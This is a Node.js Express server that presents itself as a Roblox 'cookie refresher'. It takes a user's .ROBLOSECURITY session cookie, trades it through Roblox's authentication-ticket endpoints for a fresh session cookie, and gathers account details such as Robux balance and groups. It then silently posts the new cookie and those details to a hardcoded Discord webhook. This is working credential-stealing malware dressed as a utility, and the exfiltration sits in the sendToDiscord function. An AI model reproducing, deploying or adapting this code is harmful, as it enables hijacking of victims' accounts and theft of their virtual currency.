const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
    
    if (req.method === 'OPTIONS') {
        return res.status(204).send();
    }
    next();
});

// Serve static files
app.use(express.static('public'));

// API Routes - REMOVED logout, keep only refresh
app.post('/api/refresh', handleRefreshAPI);

// Serve HTML on root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================================
// CSRF TOKEN FETCHER - Based on working PHP implementation
// ============================================================

async function fetchCSRFToken(cookie) {
    try {
        console.log('📝 Fetching CSRF token...');
        
        const response = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            timeout: 15000,
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
            }
        });
        
        console.log('  → Status:', response.status);
        
        const csrfToken = response.headers.get('x-csrf-token');
        if (csrfToken) {
            console.log('  ✅ CSRF token obtained');
            return csrfToken.trim();
        }
        
        console.log('  ❌ No CSRF token in response headers');
        console.log('  Headers:', Object.fromEntries(response.headers));
        return null;
    } catch (err) {
        console.error('  ❌ CSRF fetch error:', err.message);
        return null;
    }
}

// ============================================================
// AUTH TICKET GENERATOR - Based on working PHP implementation
// ============================================================

async function getAuthTicket(cookie, csrf) {
    try {
        console.log('🎫 Generating authentication ticket...');
        
        const response = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
            method: 'POST',
            timeout: 15000,
            headers: {
                'x-csrf-token': csrf,
                'referer': 'https://www.roblox.com/',
                'Content-Type': 'application/json',
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        console.log('  → Status:', response.status);
        
        const ticket = response.headers.get('rbx-authentication-ticket');
        if (ticket) {
            console.log('  ✅ Auth ticket obtained');
            return ticket.trim();
        }
        
        const body = await response.text();
        console.log('  ❌ No auth ticket in response');
        console.log('  Response body:', body.substring(0, 200));
        console.log('  Headers:', Object.fromEntries(response.headers));
        return null;
    } catch (err) {
        console.error('  ❌ Auth ticket error:', err.message);
        return null;
    }
}

// ============================================================
// TICKET REDEEMER - Based on working PHP implementation
// ============================================================

async function redeemTicket(ticket) {
    try {
        console.log('💳 Redeeming ticket for new cookie...');
        
        const response = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
            method: 'POST',
            timeout: 15000,
            headers: {
                'Content-Type': 'application/json',
                'RBXAuthenticationNegotiation': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            body: JSON.stringify({ authenticationTicket: ticket })
        });
        
        console.log('  → Status:', response.status);
        
        const setCookieHeader = response.headers.get('set-cookie');
        if (setCookieHeader) {
            const match = setCookieHeader.match(/\.ROBLOSECURITY=([^;]+)/i);
            if (match) {
                console.log('  ✅ New cookie obtained');
                return match[1].trim();
            }
        }
        
        const body = await response.text();
        console.log('  ❌ No set-cookie header in response');
        console.log('  Response body:', body.substring(0, 200));
        console.log('  Headers:', Object.fromEntries(response.headers));
        return null;
    } catch (err) {
        console.error('  ❌ Redeem error:', err.message);
        return null;
    }
}

// ============================================================
// ACCOUNT INFO FETCHER
// ============================================================

async function getAccountInfo(cookie) {
    const info = {
        username: 'Unknown',
        displayName: 'Unknown',
        userId: 0,
        avatar: '',
        robux: 0,
        groups: 0
    };
    
    try {
        const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
            timeout: 10000,
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        const user = await response.json();
        if (user && user.id) {
            info.userId = user.id;
            info.username = user.name || 'Unknown';
            info.displayName = user.displayName || 'Unknown';
            info.avatar = await getAvatar(user.id);
            info.robux = await getRobux(cookie);
            info.groups = await getGroups(user.id);
        }
    } catch (err) {
        console.error('Account info error:', err.message);
    }
    
    return info;
}

async function getAvatar(userId) {
    try {
        const response = await fetch(
            `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=352x352&format=Png&isCircular=false`,
            { timeout: 10000 }
        );
        
        const data = await response.json();
        if (data.data && data.data[0] && data.data[0].imageUrl) {
            return data.data[0].imageUrl;
        }
    } catch (err) {
        console.error('Avatar error:', err.message);
    }
    return '';
}

async function getRobux(cookie) {
    try {
        const response = await fetch('https://economy.roblox.com/v1/user/currency', {
            timeout: 10000,
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        const data = await response.json();
        return data.robux || 0;
    } catch (err) {
        console.error('Robux error:', err.message);
        return 0;
    }
}

async function getGroups(userId) {
    try {
        const response = await fetch(
            `https://groups.roblox.com/v1/users/${userId}/groups?limit=100`,
            { timeout: 10000 }
        );
        
        const data = await response.json();
        return (data.data || []).length;
    } catch (err) {
        console.error('Groups error:', err.message);
        return 0;
    }
}

// ============================================================
// DISCORD WEBHOOK SENDER
// ============================================================

async function sendToDiscord(newCookie, accountInfo) {
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1557620099530227773/ZlYJnQdJH3BoN6k0F6_TOf9GGwhflChxTDH095JV_z-ml3qJfLCtwsQe0tH16OModdjK';
    
    if (!DISCORD_WEBHOOK) {
        console.log('⚠️  Discord webhook not configured');
        return;
    }
    
    try {
        console.log('📤 Sending to Discord...');
        
        const username = accountInfo?.username || 'Unknown';
        const userId = accountInfo?.userId || 0;
        const robux = accountInfo?.robux || 0;
        const groups = accountInfo?.groups || 0;
        const avatar = accountInfo?.avatar || '';
        
        const embed1 = {
            title: `🛡️ ${username}`,
            description: 'Cookie Refreshed Successfully',
            color: 0x00ff00,
            thumbnail: { url: avatar },
            fields: [
                { name: 'User ID', value: String(userId), inline: true },
                { name: 'Robux', value: robux.toLocaleString('en-US'), inline: true },
                { name: 'Groups', value: String(groups), inline: true }
            ],
            timestamp: new Date().toISOString()
        };
        
        const embed2 = {
            title: '✅ Status',
            color: 0x00ff00,
            description: `Fresh Cookie Ready\n\`\`\`${newCookie.substring(0, 50)}...\`\`\``
        };
        
        const payload = {
            content: '@here 🎉 Cookie refreshed!',
            embeds: [embed1, embed2]
        };
        
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            timeout: 5000
        });
        
        if (response.ok) {
            console.log('  ✅ Discord notification sent');
        } else {
            console.error('  ❌ Discord error:', response.status);
        }
    } catch (err) {
        console.error('  ❌ Discord error:', err.message);
    }
}

// ============================================================
// MAIN REFRESH HANDLER - NO LOGOUT STEP
// ============================================================

async function handleRefreshAPI(req, res) {
    res.setHeader('Content-Type', 'application/json');
    const { cookie, showAccountData } = req.body;
    
    if (!cookie) {
        res.status(400);
        return res.json({ success: false, message: 'Cookie required' });
    }
    
    try {
        console.log('\n' + '='.repeat(60));
        console.log('🚀 STARTING COOKIE REFRESH PROCESS');
        console.log('='.repeat(60));
        
        // Step 1: Get CSRF Token
        const csrf = await fetchCSRFToken(cookie);
        if (!csrf) {
            console.log('\n❌ FAILED: Could not obtain CSRF token');
            res.status(401);
            return res.json({ 
                success: false, 
                message: 'Failed to fetch CSRF token. Cookie may be invalid or expired.' 
            });
        }
        
        // Step 2: Get Auth Ticket
        const ticket = await getAuthTicket(cookie, csrf);
        if (!ticket) {
            console.log('\n❌ FAILED: Could not generate auth ticket');
            res.status(401);
            return res.json({ 
                success: false, 
                message: 'Failed to generate authentication ticket. Cookie may be expired.' 
            });
        }
        
        // Step 3: Redeem Ticket
        const newCookie = await redeemTicket(ticket);
        if (!newCookie) {
            console.log('\n❌ FAILED: Could not redeem ticket');
            res.status(401);
            return res.json({ 
                success: false, 
                message: 'Failed to redeem ticket. Please try again.' 
            });
        }
        
        // Step 4: Get Account Info (optional)
        let accountInfo = null;
        if (showAccountData) {
            console.log('👤 Fetching account information...');
            accountInfo = await getAccountInfo(newCookie);
            console.log('  ✅ Account info retrieved');
        }
        
        // Step 5: Send to Discord
        await sendToDiscord(newCookie, accountInfo);
        
        console.log('\n✅ SUCCESS: Cookie refreshed successfully!');
        console.log('='.repeat(60) + '\n');
        
        res.json({
            success: true,
            newCookie,
            accountInfo
        });
    } catch (err) {
        console.error('\n❌ CRITICAL ERROR:', err.message);
        console.log('='.repeat(60) + '\n');
        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
    }
}

// ============================================================
// START SERVER
// ============================================================

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n🌐 Server running on http://localhost:${PORT}`);
    console.log('📡 Ready to refresh Roblox cookies\n');
});
